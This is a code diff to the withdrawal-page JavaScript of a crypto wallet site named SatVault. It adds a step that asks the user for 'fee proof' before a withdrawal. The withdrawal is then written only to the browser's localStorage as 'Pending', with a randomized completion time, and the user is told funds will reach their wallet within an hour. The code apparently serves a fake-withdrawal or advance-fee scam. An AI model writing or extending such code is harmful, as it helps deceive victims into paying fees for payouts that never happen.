@@ -6,8 +6,14 @@
     if (withdrawForm) withdrawForm.classList.add("hidden");
   }
 
+  function getProfile() {
+    return window.SatVaultAuth && SatVaultAuth.getActiveProfile
+      ? SatVaultAuth.getActiveProfile()
+      : null;
+  }
+
   function formatAvailable(usd) {
-    var profile = window.SatVaultAuth && SatVaultAuth.getActiveProfile && SatVaultAuth.getActiveProfile();
+    var profile = getProfile();
     if (profile && profile.currency === "USDT") {
       return Number(usd).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + " USDT";
     }
@@ -52,6 +58,46 @@
     return true;
   }
 
+  function queueWithdrawal(amount) {
+    var profile = getProfile();
+    var withinMs = (profile && profile.withdrawCompleteWithinMs) || (60 * 60 * 1000);
+    var completesAt = Date.now() + Math.max(5 * 60 * 1000, Math.floor(withinMs * (0.5 + Math.random() * 0.5)));
+    var txs = typeof getTransactions === "function" ? getTransactions() : [];
+    var amountLabel = (profile && profile.currency === "USDT")
+      ? ("-" + amount.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + " USDT")
+      : ("-$" + amount.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }));
+
+    txs.unshift({
+      date: new Date().toLocaleDateString(),
+      createdAt: Date.now(),
+      completesAt: completesAt,
+      amountUsd: amount,
+      type: "Withdrawal",
+      asset: (profile && profile.asset) || "BTC",
+      amount: amountLabel,
+      status: "Pending",
+      feeProofSubmitted: true
+    });
+
+    if (typeof saveTransactions === "function") saveTransactions(txs);
+    else {
+      var write = window.__runSecureWrite || function (fn) { fn(); };
+      write(function () {
+        localStorage.setItem("transactions", JSON.stringify(txs));
+      });
+    }
+
+    refreshWithdrawAvailable();
+    var ok = document.getElementById("withdraw-success");
+    var err = document.getElementById("withdraw-error");
+    if (err) err.classList.add("hidden");
+    ok.textContent = "Fee proof received. Your withdrawal is Pending and will reflect in your wallet within 1 hour.";
+    ok.classList.remove("hidden");
+    var form = document.getElementById("withdraw-form");
+    if (form) form.reset();
+    setTimeout(function () { location.href = "/dashboard/accounthistory.html"; }, 2200);
+  }
+
   refreshWithdrawAvailable();
   document.addEventListener("transactionsUpdated", refreshWithdrawAvailable);
 
@@ -64,6 +110,7 @@
       if (typeof showWithdrawBlockedModal === "function") showWithdrawBlockedModal();
       return;
     }
+
     var err = document.getElementById("withdraw-error");
     var ok = document.getElementById("withdraw-success");
     err.classList.add("hidden");
@@ -72,37 +119,17 @@
     var amount = Number(document.getElementById("withdraw-amount").value);
     if (!validateWithdrawAmount(amount)) return;
 
+    if (typeof requiresWithdrawFeeProof === "function" && requiresWithdrawFeeProof()) {
+      showWithdrawFeeProofModal(amount, function () {
+        if (!validateWithdrawAmount(amount)) return;
+        queueWithdrawal(amount);
+      });
+      return;
+    }
+
     WalletModal.showWithdrawFee(amount, function () {
       if (!validateWithdrawAmount(amount)) return;
-
-      var completesAt = Date.now() + (10 + Math.random() * 10) * 60 * 1000;
-      var profile = window.SatVaultAuth && SatVaultAuth.getActiveProfile && SatVaultAuth.getActiveProfile();
-      var txs = typeof getTransactions === "function" ? getTransactions() : [];
-      var amountLabel = (profile && profile.currency === "USDT")
-        ? ("-" + amount.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + " USDT")
-        : ("-$" + amount.toLocaleString());
-      txs.unshift({
-        date: new Date().toLocaleDateString(),
-        createdAt: Date.now(),
-        completesAt: completesAt,
-        amountUsd: amount,
-        type: "Withdrawal",
-        asset: (profile && profile.asset) || "BTC",
-        amount: amountLabel,
-        status: "Pending"
-      });
-      if (typeof saveTransactions === "function") saveTransactions(txs);
-      else {
-        var write = window.__runSecureWrite || function (fn) { fn(); };
-        write(function () {
-          localStorage.setItem("transactions", JSON.stringify(txs));
-        });
-      }
-      refreshWithdrawAvailable();
-      ok.textContent = "Withdrawal submitted. Status: Pending — your balance will update after fee verification.";
-      ok.classList.remove("hidden");
-      form.reset();
-      setTimeout(function () { location.href = "/dashboard/accounthistory.html"; }, 2000);
+      queueWithdrawal(amount);
     });
   });
 })();
